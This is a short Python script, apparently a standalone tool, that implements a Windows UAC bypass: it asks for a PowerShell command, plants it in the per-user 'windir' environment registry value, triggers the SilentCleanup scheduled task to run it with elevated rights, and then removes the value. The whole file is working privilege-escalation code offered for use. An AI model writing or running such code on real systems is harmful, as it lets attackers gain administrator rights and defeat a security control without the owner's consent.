import os

class bypassuac:
    def bypass():
            order=input("輸入須繞越UAC指令(於powershell上的指令模式):")
            command="'powershell "+order+";#'"
            os.system("powershell Set-ItemProperty -Path ""HKCU:\Environment"" -Name ""windir"" -Value "+command)
            os.system("schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I")
            os.system("powershell Remove-ItemProperty -Path ""HKCU:\Environment"" -Name ""windir""")
    #bypass()